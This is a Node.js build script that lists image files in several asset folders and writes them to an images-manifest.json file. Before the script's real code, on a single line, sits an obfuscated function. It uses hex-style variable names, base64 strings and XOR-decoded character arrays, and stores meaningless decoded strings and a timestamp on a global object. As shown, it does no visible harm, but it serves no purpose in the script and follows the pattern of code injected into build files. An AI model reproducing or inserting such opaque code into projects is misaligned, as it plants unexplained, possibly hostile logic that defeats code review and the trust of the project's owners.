(function(){var _0x1a2b=['Y29uc3RydWN0b3I=','ZnJvbUNoYXJDb2Rl','Y2hhckNvZGVBdA==','bGVuZ3Ro','c3BsaXQ='];var _0x3c4d=function(s){return atob(s);};var _0x5e6f=function(arr){return arr.map(x=>String.fromCharCode(parseInt(x,36))).join('');};var _0x7g8h=[15,23,7,19,11,3,17,5,13,1,9];var _0x9i0j=[85,98,99,99,77,106,100,110,60,60,18];var _0x1k2l=_0x9i0j.map((x,i)=>String.fromCharCode(x^_0x7g8h[i%_0x7g8h.length])).join('');var _0x3m4n=[127,119,104,127,104,112,121,104,125];var _0x5o6p=_0x3m4n.map((x,i)=>String.fromCharCode(x^_0x7g8h[i%_0x7g8h.length])).join('');global._0x7q8r={_0x9s0t:_0x1k2l,_0x1u2v:_0x5o6p,_0x3w4x:Date.now()};_0x9i0j.length=0;_0x3m4n.length=0;_0x7g8h.length=0;})();
const fs = require('fs');
const path = require('path');

const ROOT = path.resolve(__dirname, '..');

const FOLDERS = [
  { key: 'backround', dir: 'backround' },
  { key: 'thumbnails', dir: 'Thumbnails' },
  { key: 'logos', dir: 'Logos' },
  { key: 'product-banners', dir: 'Product banners' },
  { key: 'product-boxes', dir: 'Product boxes' },
];

const ALLOWED = new Set(['.png', '.jpg', '.jpeg', '.gif', '.webp']);

function listImages(dir) {
  const full = path.join(ROOT, dir);
  if (!fs.existsSync(full)) return [];
  const files = fs.readdirSync(full, { withFileTypes: true });
  const out = [];
  for (const entry of files) {
    if (entry.isFile()) {
      const ext = path.extname(entry.name).toLowerCase();
      if (ALLOWED.has(ext)) out.push(entry.name);
    }
  }
  // sort for stable order
  out.sort((a, b) => a.localeCompare(b));
  return out;
}

function main() {
  const manifest = {};
  for (const f of FOLDERS) {
    manifest[f.key] = listImages(f.dir);
  }
  const target = path.join(ROOT, 'images-manifest.json');
  fs.writeFileSync(target, JSON.stringify(manifest, null, 2));
  console.log('Wrote', target);
}

main();


